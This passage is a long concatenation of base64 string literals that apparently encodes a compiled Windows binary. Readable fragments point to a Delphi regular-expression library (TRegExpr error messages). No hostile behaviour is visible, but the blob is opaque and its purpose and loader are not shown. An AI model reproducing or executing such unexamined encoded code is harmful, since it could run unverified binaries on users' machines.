'i9aLRfyLCP9RRDPAWllZZIkQaOkuQgCLRfzorQMAAMPp1xH+/+vwi8OLFUTlQQDoOA7+/4TAD4SjAAAAi0X86MwCAAAzwFVo2C5CAGT/MGSJIItF/IsQ/1JIi/OLxuix1v//D7bAi1X8ZolCDovG6KzV///of/7//4tV/GaJQgyLxuhN1f//6Gz+//+LVfxmiUIGjVX4i8boT9X//4tV+ItF/IPACOjdIf7/i8bohtX//4tV/IhCEIvWi0X8iwj/' + 
'UUAzwFpZWWSJEGjpLkIAi0X86PUCAADD6R8R/v/r8IvTi0X86G/D//8zwFpZWWSJEGgGL0IAjUX46NIY/v/D6fgQ/v/r8F5bWVldw1WL7GoAagBTi9gzwFVocC9CAGT/MGSJII1F+IvT6PIg/v+LVfiNRfzoHxv+/4tF/IXAdAWD6ASLAEh1CItF/A+2GOsCsz8zwFpZWWSJEGh3L0IAjUX46J0f/v+NRfzoYRj+/8PphxD+/+voi8NbWVldw4vA' + 
'VYvsM8lRUVFRUVFTVleJVfyL2DPAVWgBMUIAZP8wZIkgi0X8ixVYKEIA6L0M/v+EwHQPi9OLRfyLCP9RCOkRAQAAi0X8ixVE5UEA6JwM/v+EwA+E8QAAAIt1/IvG6ALG//8zwFVowjBCAGT/MGSJIIvGixD/UkSLw+iuDgAA6An///+L0IvG6CDV//+Lw+jRDQAA6PT+//+L0IvG6HfU//+Lw+hsDQAA6N/+//+L0IvG6BrU//+NVfCLw+hwDQAA' + 
'i1XwjUX06A0a/v+LVfSLxugX1P//i8PopA0AAIvQi8boT9T//4vDixD/UhRIhcB8O0CJRfgz9o1N6IvWi8OLOP9XDItV6I1F7OjKGf7/i0XsUIvWi8OLCP9RGIvIi0X8Wos4/1c8Rv9N+HXLM8BaWVlkiRBo0zBCAItF/Ojfxf//w+k1D/7/6/CLVfyLw+hpwv//M8BaWVlkiRBoCDFCAI1F6OgcHv7/jUXs6OAW/v+NRfDoDB7+/41F9OjQFv7/' + 
'w+n2Dv7/69hfXluL5V3DkFOL2IN7FAB1CbIBi8OLCP9RMP9DFFvDkFWL7FNWi0UIi0D8i3AghfZ0LbMBi0UIi8aLFVgoQgDoIAv+/4TAdCeLRQiL1otFCItA+OiAAAAAi9iA8wHrEItFCItA+IsQ/1IUhcAPn8OLw15bXcONQABVi+yDxPhTiVX8iUX4i0X4UGjsOUIAi0X4UGgQPUIAVeiD////WYvIusQxQgCLRfyLGP9TBFtZWV3DAAD/////' + 
'BwAAAFN0cmluZ3MA/0gUg3gUAHUHM9KLCP9RMMONQABVi+yDxOxTVlczyYlN8IlN7IlV+IlF/DPAVWh1MkIAZP8wZIkgxkX3AItF/IsQ/1IUi9iLRfiLEP9SFDvYdTuL806F9nwwRjPbjU3wi9OLRfyLOP9XDItF8FCNTeyL04tF+Is4/1cMi1XsWOh8H/7/dQhDTnXTxkX3ATPAWllZZIkQaHwyQgCNRey6AgAAAOioHP7/w+mCDf7/6+sPtkX3' + 
'X15bi+Vdw5CLRQTDVYvsg8T0U1Yz24ld9Ivxi9ozwFVo8jJCAGT/MGSJIOjY////UIl1+MZF/ACNRfhQagCNRfSL0+iQF/7/i030sgGhVONBAOg9j/7/6QAO/v8zwFpZWWSJEGj5MkIAjUX06N8U/v/D6QUN/v/r8F5bi+Vdw5BVi+xqAGoAU1ZXi/mL8ovYM8BVaF0zQgBk/zBkiSCNVfiLxuhoNP7/i1X4jUX86FUd/v+LVfyLz4vD6E3///8z' + 
'wFpZWWSJEGhkM0IAjUX46HwU/v+NRfzoqBv+/8Ppmgz+/+voX15bWVldw5BVi+yDxPBTVlcz24ld8Ild/Ivxi9qJRfgzwFVoRzRCAGT/MGSJIItF+Oh2/f//M8BVaCI0QgBk/zBkiSCNTfyL04tF+Is4/1cMi9OLRfiLCP9RGIlF9I1N8IvWi0X4izj/VwyLTfCL04tF+Is4/1cgi9aLRfiLCP9RGIvIi9OLRfiLGP9TJItN/IvWi0X4ixj/UyCL' + 
'TfSL1otF+IsY/1MkM8BaWVlkiRBoKTRCAItF+Oir/f//w+nVC/7/6/AzwFpZWWSJEGhONEIAjUXw6MYa/v+NRfzovhr+/8PpsAv+/+voX15bi+Vdw41AAIsQ/1IUw4vAM8DDkFWL7GoAU4vYM8BVaKk0QgBk/zBkiSCNVfyLw4sI/1Eci0X86Awc/v/oE/P//4vYM8BaWVlkiRBosDRCAI1F/OhcGv7/w+lOC/7/6/CLw1tZXcOLwFWL7IPE4FNW' + 
'VzPJiU3giU38iU34iVXwiUX0M8BVaNc1QgBk/zBkiSCLRfSLEP9SFIlF6DPbjUX4uuw1QgDobhr+/4t16E6F9nwyRsdF7AAAAACNTeCLVeyLRfSLOP9XDItF4OiIG/7/i/iLRfjofhv+/wP4A9//RexOddaLRfCLyzPS6Lwa/v+LRfCLAIlF5It16E6F9nxkRsdF7AAAAACNTfyLVeyLRfSLGP9TDItF/Og6G/7/i9iF23QWi8sDyYtV5ItF/OiZ' + 
'+v3/i8MDwAFF5ItF+OgWG/7/i9iF23QWi8sDyYtV5ItF+Oh1+v3/i8MDwAFF5P9F7E51pDPAWllZZIkQaN41QgCNReDoOxn+/41F+LoCAAAA6EYZ/v/D6SAK/v/r419eW4vlXcMAAAAEAAAADQAKAAAAAABVi+yDxPRTVlczyYlN9IlV/IvYM8BVaGw2QgBk/zBkiSCLw4sQ/1IUi/BOhfZ8LEbHRfgAAAAAjU30i1X4i8OLOP9XDItV9ItN/IvD' + 
'izj/VzSFwHQN/0X4TnXcx0X4/////zPAWllZZIkQaHM2QgCNRfTomRj+/8Ppiwn+/+vwi0X4X15bi+Vdw41AAFWL7IPE6FNWM8mJTeiJTeyJTfyJVfiL2DPAVWhDN0IAZP8wZIkgi8OLEP9SFEiFwHxnQIlF8MdF9AAAAACNTfyLVfSLw4sw/1YMi8Po2wcAAIvQjUXs6EUZ/v+LReyLVfzoRhz+/4vwhfZ0JY1F6FCLzkm6AQAAAItF/OhQG/7/' + 
'i1Xoi034i8OLMP9WNIXAdA//RfT/TfB1pMdF9P////8zwFpZWWSJEGhKN0IAjUXougIAAADo4hf+/41F/OjCF/7/w+m0CP7/6+OLRfReW4vlXcOQU1ZXVYvqi/iLx4sQ/1IUi9hLhdt8FEMz9ovWi8eLCP9RGDvodAdGS3Xvg87/i8ZdX15bw1WL7FFTVleJTfyL2ovwi038i9OLxos4/1dki00Ii9OLxosY/1MkX15bWV3CBACLwFWL7IPE+FNW' + 
'M8mJTfiL8ovYM8BVaEA4QgBk/zBkiSBqII1F+IvW6HUS/v+LTfiyAaF86EEA6DLX//+JRfwzwFVoIzhCAGT/MGSJIItV/IvDiwj/UXAzwFpZWWSJEGgqOEIAi0X86L4C/v/D6dQH/v/r8DPAWllZZIkQaEc4QgCNRfjokQ/+/8Pptwf+/+vwXltZWV3DjUAAVYvsg8T4U1YzyYlN/IvaiUX4M8BVaPQ4QgBk/zBkiSCLRfjomPj//zPAVWjXOEIA' + 
'ZP8wZIkgi8OLEP8Si/CLw+iP0///K/CLztH5eQOD0QCNRfwz0uhSF/7/i1X8i86Lw4sY/1MMi1X8i0X4iwj/USwzwFpZWWSJEGjeOEIAi0X46Pb4///D6SAH/v/r8DPAWllZZIkQaPs4QgCNRfzoERb+/8PpAwf+/+vwXltZWV3DjUAAVYvsg8T0U1ZXM9uJXfyL+YvyiUX4M8BVaKk5QgBk/zBkiSA7/nRoi0X46N33//8zwFVojDlCAGT/MGSJ' + 
'II1N/IvWi0X4ixj/UwyL1otF+IsI/1EYiUX0i9aLRfiLCP9RTItF9FCLTfyL14tF+IsY/1NoM8BaWVlkiRBokzlCAItF+OhB+P//w+lrBv7/6/AzwFpZWWSJEGiwOUIAjUX86FwV/v/D6U4G/v/r8F9eW4vlXcOQU1ZXVYvpi/KL2IvWi8OLCP9RGIv4i9aLw4sI/1FMV4vNi9aLw4sY/1NoXV9eW8OQw41AAFWL7IPE9DPJiU30iVX4iUX8M8BV' + 
'aJA6QgBk/zBkiSCLRfjoTdz//4tF/Oj19v//M8BVaGs6QgBk/zBkiSCLRfyLEP9SSOsWjVX0i0X46Crd//+LVfSLRfyLCP9ROItF+Ohj2///hMB03jPAWllZZIkQaHI6QgCLRfzoYvf//8PpjAX+/+vwi0X46O7b//8zwFpZWWSJEGiXOkIAjUX06HUU/v/D6WcF/v/r8IvlXcOQVYvsg8T4U1YzyYlN+Ivyi9gzwFVoJztCAGT/MGSJIGj//wAA' + 
'jUX4i9bojg/+/4tN+LIBoXzoQQDoS9T//4lF/DPAVWgKO0IAZP8wZIkgi1X8i8OLCP9RfDPAWllZZIkQaBE7QgCLRfzo1//9/8Pp7QT+/+vwM8BaWVlkiRBoLjtCAI1F+OiqDP7/w+nQBP7/6/BeW1lZXcNVi+xqAFNWi/KL2DPAVWiDO0IAZP8wZIkgjVX8i8OLCP9RHItF/OhJFf7/i8gDyYtV/IvG6LvS//8zwFpZWWSJEGiKO0IAjUX86IIT' + 
'/v/D6XQE/v/r8F5bWV3DkMONQABTVovyi9iDexgAdAiLQxiLEP9SEI1DGIvW6FIn/v+DexgAdAqL04tDGIsI/1EMXlvDjUAAVYvsagBTVovyi9gzwFVoCzxCAGT/MGSJII1F/IvW6EUU/v+LVfyLw4sI/1EsM8BaWVlkiRBoEjxCAI1F/Oj6Ev7/w+nsA/7/6/BeW1ldw5BVi+yDxPhTVjPJiU38i9qJRfgzwFVo3zxCAGT/MGSJIItF+OjQ9P//' + 
'M8BVaMI8QgBk/zBkiSCLRfiLEP9SSIXbdFLrSovz6wODwwIPtwO67DxCAOh86///hMB07IvLK87R+XkDg9EAjUX8i9bocxP+/4tV/ItF+IsI/1E4ZoM7DXUDg8MCZoM7CnUDg8MCZoM7AHWwM8BaWVlkiRBoyTxCAItF+OgL9f//w+k1A/7/6/AzwFpZWWSJEGjmPEIAjUX86CYS/v/D6RgD/v/r8F5bWVldwwEkAAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAw41AAFWL7IPE9FNWVzPJiU30iVX4iUX8M8BVaIY9QgBk/zBkiSCLRfjoxt7//4tF/IsQ/1IUi9hLhdt8H0Mz9o1N9IvWi0X8izj/VwyLVfSLRfjorN///0ZLdeSLRfjomN7//zPAWllZZIkQaI09QgCNRfTofxH+/8PpcQL+/+vwX15bi+Vdw1OL2PZDBAF1C2a6LACLw+hwAAAAD7dDBlvDi8BTVovyi9j2QwQIdQy63D1C' + 
'AIvD6HAAAACLxotTCOhuEf7/XlvDAAAABAAAAA0ACgAAAAAAU4vY9kMEAnULZroiAIvD6GwAAAAPt0MMW8OLwFOL2PZDBBB1CTPSi8PocgAAAA+2QxBbw1NWi/KL2GY7cwZ1BvZDBAF1CIBLBAFmiXMGXlvDjUAAU1aL8ovYi0MIi9bohBP+/3UG9kMECHUOgEsECI1DCIvW6OIQ/v9eW8ONQABTVovyi9hmO3MMdQb2QwQCdQiASwQCZolzDF5b' + 
'w41AAFNWi9qL8DpeEHUG9kYEEHUHgE4EEIheEF5bw5CLwovR6NNL/v/Di8BTi9j2QwQEdQtmuj0Ai8PoCAAAAA+3Qw5bw4vAU1aL8ovYZjtzDnUG9kMEBHUIgEsEBGaJcw5eW8ONQABTVujh/v3/i9qL8DPAiUYwiUY0M8CJRjiJRjyL04Di/IvG6O3r//+LRiCFwHQQi8iLRhyLFXwpQgDoyhX+/zPAiUYgM9KLxosI/1EohNt+B4vG6Dn+/f9e' + 
'W8OLwFNWi/AzyYvGixj/UzxeW8NTVldVUYv5i/KL2IB7KAB1CItDIIkEJOsvi8yL1ovDiyj/lZAAAACEwHQdD7ZDKSwBcib+yHQC6w+LFZwlQwAzyYvD6GTz//9Xi86LVCQEi8OLGP+TjAAAAIsEJFpdX15bw4vAU4N4FAB1EWaDeDIAdAqL2IvQi0M0/1MwW8OLwFODeBQAdRFmg3g6AHQKi9iL0ItDPP9TOFvDi8BTi9iDeyAAdDOLw4sQ/5KI' + 
'AAAAi0Mci0sgixV8KUIA6NwU/v8zwIlDIDPSi8OLCP9RKIvDixD/koQAAABbw4vAU1aL8ovYhfZ8BTtzIHwPixXEJkMAi86Lw+iy8v//i8OLEP+SiAAAAItDHI0E8IsVfClCAOhzFf7//0sgi0MgO/B9HCvGi8gDyQPJA8mLQxyNFPCLQxyNRPAI6I3v/f+Lw4sQ/5KEAAAAXlvDU1ZXi/mL8ovYhfZ8BTtzIHwPixXEJkMAi86Lw+hD8v//hf98' + 
'BTt7IHwPixXEJkMAi8+Lw+gr8v//i8OLEP+SiAAAAIvPi9aLw+gOAAAAi8OLEP+ShAAAAF9eW8NTi1gcjRTTi0AcjQTIiwqLGIkaiQiLSgSLWASJWgSJSARbw5BTVldVg8TsiUwkBIkUJIv4xkQkCAAz9otHIEiJRCQMO3QkDH9Ji1wkDAPe0euLRxyLFNiLDCSLx4so/1U0iUQkEIN8JBAAfQWNcwHrG4vDSIlEJAyDfCQQAHUNxkQkCAGAfykB' + 
'dAKL8zt0JAx+t4tEJASJMA+2RCQIg8QUXV9eW8ONQABTVleL+Yvyi9iF9nwFO3MgfA+LFcQmQwCLzovD6D/x//+Lx4tTHIsU8uhyDf7/X15bw4vAi0Akw4tAIMNTVovyi9iF9nwFO3MgfA+LFcQmQwCLzovD6Abx//+LQxyLRPAEXlvDVotQJIP6QH4Oi/KF9nkDg8YDwf4C6xGD+gh+B74QAAAA6wW+BAAAAAPyi9aLCP9RKF7DkFNWUYvyi9iA' + 
'eygAdQ6L1ovD6Kbz//+JBCTrGYvMi9aLw4sY/5OQAAAAhMB1B8cEJP////+LBCRaXlvDkFNWi/BqAIvGixj/U2heW8NVi+xTVleL+Yvyi9iAeygAdA+LFQAmQwAzyYvD6Fvw//+F9nwFO3Mgfg+LFcQmQwCLzovD6EPw//+LRQhQi8+L1ovDixj/k4wAAABfXltdwgQAi8BVi+xTVleL+Yvyi9iLw4sQ/5KIAAAAi0MgO0MkdQeLw+gH////i0Mg' + 
'O/B9IItTHI1U8ghSi1McjRTyK8aLyAPJA8kDyYvCWuj47P3/i0McjQTwi/AzwIkGi0UIiUYEi8aL1+gBDP7//0Mgi8OLEP+ShAAAAF9eW13CBACQU1ZXi/mL8ovYgHsoAHQPixUAJkMAM8mLw+iO7///hfZ8BTtzIHwPixXEJkMAi86Lw+h27///i8OLEP+SiAAAAItDHI0E8IvX6J8L/v+Lw4sQ/5KEAAAAX15bw5BTVleL+Yvyi9iF9nwFO3Mg' + 
'fA+LFcQmQwCLzovD6C/v//+Lw4sQ/5KIAAAAi0MciXzwBIvDixD/koQAAABfXlvDVYvsg8TwU1aJTfSJVfiJRfyLXfiLdfSLRfgDRfTR6IlF8OsBQ4tN8IvTi0X8/1UIhcB88OsBTotN8IvWi0X8/1UIhcB/8DvzfCCLzovTi0X86LL8//87XfB1BYl18OsIO3XwdQOJXfBDTjvzfbc7dfh+EYtFCFCLzotV+ItF/Oh8////iV34O130fIVeW4vl' + 
'XcIEAFNWi/KL2IvWA9ID0gPSjUMc6Mbp/f+JcyReW8NTVovai/A6Xih0EYTbdAqLxosQ/5KUAAAAiF4oXlvDkITSdAmLEP+SiAAAAMOLEP+ShAAAAMOLwFNWV4v6i/CLRhyLDMiLRhyLFPiLxosY/1M0X15bw4vAuthEQgCLCP+RmAAAAMOLwFNWi/KL2IB7KAB1KIN7IAF+IovDixD/kogAAABWi0sgSTPSi8Povv7//4vDixD/koQAAABeW8OQ' + 
'gHgqAHQKi8KL0ejBRP7/w4vCi9HoI0X+/8OLwFWL7DPAVWiBRUIAZP8wZIkg/wWQekMAM8BaWVlkiRBoiEVCAMPpdvr9/+v4XcOLwP////8FAAAAIAkKDQwAAAD/////PwAAADAxMjM0NTY3ODlhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaXwD/////AgAAAA0KAAD/////AgAAAA0KAABIRkIA' + 
'AAAAAAAAAABQRkIAAAAAAAAAAAAAAAAAAAAAAHpGQgC0AwAAZBBAAOw8QAD4PEAA/DxAAAA9QAD0PEAAeDpAAJQ6QABoU0IASJBCAPRGQgAOAAAAAAAEAAAASBBAAHQDAABIEEAAeAMAAEgQQACIAwAASBBAAJADAAAIVFJlZ0V4cHKQ0EZCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQRkIAFAAAAEx6QADsPEAA+DxAAPw8QAAAPUAA' + 
'9DxAAHg6QACUOkAA0DpAAAhFUmVnRXhwco1AAP////8OAAAAXiQuWygpfD8rKlx7XX0AAFOL2YP6eg+PowAAAA+EZAIAAIP6bH9ZD4TNAQAAg/pnfysPhHwBAACD6gEPgjsBAACD6mMPhEABAABKD4RHAQAASg+ETgEAAOkzAwAAg+poD4RcAQAASg+EYwEAAEoPhGoBAABKD4RxAQAA6RADAACDwpOD+goPhwQDAAD/JJV3R0IA7EhCAPpIQgAI' + 
'SUIAFklCACRJQgAySUIAQElCAE5JQgB0SkIAdEpCAFxJQgCB+uwDAAB/XQ+ERQIAAIH6gAAAAH8pD4TxAQAAg+p8D4SwAQAASg+EtwEAAEoPhL4BAABKD4TFAQAA6ZICAACB6ugDAAAPhNABAABKD4TXAQAASg+E3gEAAEoPhOUBAADpbAIAAIH68wMAAH8sD4QmAgAAgertAwAAD4TiAQAASg+E6QEAAEoPhPABAABKD4T3AQAA6TgCAACB6vYD' + 
'AAAPhAICAABKD4QJAgAAgerZAwAAD4QLAgAA6RQCAACLw7qMSkIA6Lj//f9bw4vDuqBKQgDoqv/9/1vDi8O6yEpCAOic//3/W8OLw7rwSkIA6I7//f9bw4vDuiBLQgDogP/9/1vDi8O6IEtCAOhy//3/W8OLw7pQS0IA6GT//f9bw4vDuoBLQgDoVv/9/1vDi8O6tEtCAOhI//3/W8OLw7rYS0IA6Dr//f9bw4vDugBMQgDoLP/9/1vDi8O6LExC' + 
'AOge//3/W8OLw7pcTEIA6BD//f9bw4vDuoxMQgDoAv/9/1vDi8O6xExCAOj0/v3/W8OLw7rsTEIA6Ob+/f9bw4vDuhRNQgDo2P79/1vDi8O6RE1CAOjK/v3/W8OLw7poTUIA6Lz+/f9bw4vDupxNQgDorv79/1vDi8O6zE1CAOig/v3/W8OLw7oITkIA6JL+/f9bw4vDujhOQgDohP79/1vDi8O67E5CAOh2/v3/W8OLw7ocT0IA6Gj+/f9bw4vD' + 
'uoBPQgDoWv79/1vDi8O6vE9CAOhM/v3/W8OLw7rwT0IA6D7+/f9bw4vDuihQQgDoMP79/1vDi8O6ZFBCAOgi/v3/W8OLw7qQUEIA6BT+/f9bw4vDusRQQgDoBv79/1vDi8O6/FBCAOj4/f3/W8OLw7owUUIA6Or9/f9bw4vDumxRQgDo3P39/1vDi8O6mFFCAOjO/f3/W8OLw7rEUUIA6MD9/f9bw4vDuvhRQgDosv39/1vDi8O6JFJCAOik/f3/' + 
'W8MAAP////8JAAAATm8gZXJyb3JzAAAA/////x0AAABUUmVnRXhwcihjb21wKTogTnVsbCBBcmd1bWVudAAAAP////8eAAAAVFJlZ0V4cHIoY29tcCk6IFJlZ2V4cCBUb28gQmlnAAD/////JAAAAFRSZWdFeHByKGNvbXApOiBQYXJzZVJlZyBUb28gTWFueSAoKQAAAAD/////JQAAAFRSZWdFeHByKGNvbXApOiBQYXJzZVJlZyBVbm1hdGNo' + 
'ZWQgKCkAAAD/////JAAAAFRSZWdFeHByKGNvbXApOiBQYXJzZVJlZyBKdW5rIE9uIEVuZAAAAAD/////KQAAAFRSZWdFeHByKGNvbXApOiAqKyBPcGVyYW5kIENvdWxkIEJlIEVtcHR5AAAA/////xoAAABUUmVnRXhwcihjb21wKTogTmVzdGVkICo/KwAA/////x0AAABUUmVnRXhwcihjb21wKTogQmFkIEhleCBEaWdpdAAAAP////8gAAAA' + 
'VFJlZ0V4cHIoY29tcCk6IEludmFsaWQgW10gUmFuZ2UAAAAA/////yUAAABUUmVnRXhwcihjb21wKTogUGFyc2UgQXRvbSBUcmFpbGluZyBcAAAA/////yQAAABUUmVnRXhwcihjb21wKTogTm8gSGV4IENvZGUgQWZ0ZXIgXHgAAAAA/////ywAAABUUmVnRXhwcihjb21wKTogSGV4IENvZGUgQWZ0ZXIgXHggSXMgVG9vIEJpZwAAAAD/////' + 
'HAAAAFRSZWdFeHByKGNvbXApOiBVbm1hdGNoZWQgW10AAAAA/////xwAAABUUmVnRXhwcihjb21wKTogSW50ZXJuYWwgVXJwAAAAAP////8kAAAAVFJlZ0V4cHIoY29tcCk6ID8rKnsgRm9sbG93cyBOb3RoaW5nAAAAAP////8aAAAAVFJlZ0V4cHIoY29tcCk6IFRyYWlsaW5nIFwAAP////8rAAAAVFJlZ0V4cHIoY29tcCk6IFJhcnNlQXRv' + 
'bSBJbnRlcm5hbCBEaXNhc3RlcgD/////JwAAAFRSZWdFeHByKGNvbXApOiBCUkFDRVMgQXJndW1lbnQgVG9vIEJpZwD/////MAAAAFRSZWdFeHByKGNvbXApOiBCUkFDRSBNaW4gUGFyYW0gR3JlYXRlciB0aGVuIE1heAAAAAD/////JAAAAFRSZWdFeHByKGNvbXApOiBVbmNsb3NlZCAoPyNDb21tZW50KQAAAAD/////qQAAAFRSZWdFeHBy' + 
'KGNvbXApOiBJZiB5b3Ugd2FudCB0YWtlIHBhcnQgaW4gYmV0YS10ZXN0aW5nIEJSQUNFUyAne21pbixtYXh9JyBhbmQgbm9uLWdyZWVkeSBvcHMgJyo/JywgJys/JywgJz8/JyBmb3IgY29tcGxleCBjYXNlcyAtIHJlbW92ZSAnLicgZnJvbSB7LiRERUZJTkUgQ29tcGxleEJyYWNlc30AAAD/////JAAAAFRSZWdFeHByKGNvbXApOiBVcmVj' + 
'b2duaXplZCBNb2RpZmllcgAAAAD/////WAAAAFRSZWdFeHByKGNvbXApOiBMaW5lUGFpcmVkU2VwYXJhdG9yIG11c3QgY291bnRhaW4gdHdvIGRpZmZlcmVudCBjaGFycyBvciBubyBjaGFycyBhdCBhbGwAAAAA/////zAAAABUUmVnRXhwcihleGVjKTogUmVnUmVwZWF0IENhbGxlZCBJbmFwcHJvcHJpYXRlbHkAAAAA/////ysAAABUUmVn' + 
'RXhwcihleGVjKTogTWF0Y2hQcmltIE1lbW9yeSBDb3JydXB0aW9uAP////8sAAAAVFJlZ0V4cHIoZXhlYyk6IE1hdGNoUHJpbSBDb3JydXB0ZWQgUG9pbnRlcnMAAAAA/////zAAAABUUmVnRXhwcihleGVjKTogTm90IEFzc2lnbmVkIEV4cHJlc3Npb24gUHJvcGVydHkAAAAA/////yEAAABUUmVnRXhwcihleGVjKTogQ29ycnVwdGVkIFBy' + 
'b2dyYW0AAAD/////KQAAAFRSZWdFeHByKGV4ZWMpOiBObyBJbnB1dCBTdHJpbmcgU3BlY2lmaWVkAAAA/////y0AAABUUmVnRXhwcihleGVjKTogT2Zmc2V0IE11c3QgQmUgR3JlYXRlciBUaGVuIDAAAAD/////KgAAAFRSZWdFeHByKGV4ZWMpOiBFeGVjTmV4dCBXaXRob3V0IEV4ZWNbUG9zXQAA/////zIAAABUUmVnRXhwcihleGVjKTog' + 
'R2V0SW5wdXRTdHJpbmcgV2l0aG91dCBJbnB1dFN0cmluZwAA/////yAAAABUUmVnRXhwcihkdW1wKTogQ29ycnVwdGVkIE9wY29kZQAAAAD/////IwAAAFRSZWdFeHByKGV4ZWMpOiBMb29wIFN0YWNrIEV4Y2VlZGVkAP////8oAAAAVFJlZ0V4cHIoZXhlYyk6IExvb3AgV2l0aG91dCBMb29wRW50cnkgIQAAAAD/////IwAAAFRSZWdFeHBy' + 
'KG1pc2MpOiBCYWQgcC1jb2RlIGltcG9ydGVkAP////8NAAAAVW5rbm93biBlcnJvcgAAAFNWhNJ0CIPE8Ojm6v3/i9qL8DPSi8boYej9/zPAiYZYAwAAM8CJhlwDAAAzwImGYAMAADPAiYZQAwAAxoZUAwAAAA+2DcAkQwC6AQAAAIvG6PMEAAAPtg3EJEMAugIAAACLxujgBAAAD7YNyCRDALoDAAAAi8bozQQAAA+2DcwkQwC6BAAAAIvG6LoE' + 
'AAAPtg3QJEMAugUAAACLxuinBAAAjYZ0AwAAixXUJEMA6D71/f+NhngDAACLFdgkQwDoLfX9/4sF5CRDAImGgAMAAIsF6CRDAImGhAMAAI2GiAMAAIsV3CRDAOgE9f3/ixXgJEMAi8boczwAAMZGBAGNhpADAAC6ZFNCAOjj9P3/i8aE23QP6DTq/f9kjwUAAAAAg8QMi8ZeW8MA/////wIAAAANCgAAU1boYer9/4vai/CLhlgDAACFwHQN6Mba' + 
'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' + 
